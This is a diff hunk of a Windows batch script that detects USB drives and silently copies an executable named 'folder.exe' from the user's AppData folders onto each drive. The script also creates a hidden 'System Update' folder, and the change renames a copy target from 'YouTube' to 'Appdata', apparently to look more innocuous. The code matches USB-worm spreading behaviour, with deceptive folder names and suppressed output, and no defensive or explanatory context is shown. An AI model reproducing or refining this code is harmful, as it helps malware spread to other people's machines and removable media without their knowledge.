@@ -256,14 +256,14 @@ echo *************DOWNLOAD file****************
 	echo Checking for pendrive...
 	for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
 	if %%l equ 2 (
-	mkdir %%i\YouTube > nul 2> nul
+	mkdir %%i\Appdata > nul 2> nul
 	if exist "C:\Users\%username%\AppData\Roaming\folder.exe" (
 	copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i" /Y > nul 2> nul
-	copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\YouTube" /Y > nul 2> nul
+	copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\Appdata" /Y > nul 2> nul
 	)
 	if exist "C:\Users\%username%\AppData\Local\0101\folder.exe" (
 	copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i" /Y > nul 2> nul
-	copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i\YouTube" /Y > nul 2> nul
+	copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i\Appdata" /Y > nul 2> nul
 	)
 	mkdir "%%i\System Update" > nul 2> nul
 	attrib +h "%%i\System Update" /s /d
